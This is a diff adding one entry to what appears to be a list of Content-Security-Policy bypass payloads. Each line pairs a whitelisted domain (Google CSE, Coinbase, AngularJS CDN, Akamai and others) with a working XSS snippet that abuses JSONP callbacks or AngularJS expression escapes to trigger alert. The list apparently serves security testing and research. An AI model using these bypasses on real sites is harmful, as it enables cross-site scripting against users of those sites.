@@ -53,6 +53,7 @@ client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?c
 code.angularjs.org	<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 commerce.coinbase.com	<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>
 connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
+content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 cse.google.com	<script src="https://cse.google.com/cse/element/v1?cx=000470283453218169915:hcrzdwsiwrc&callback=alert"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
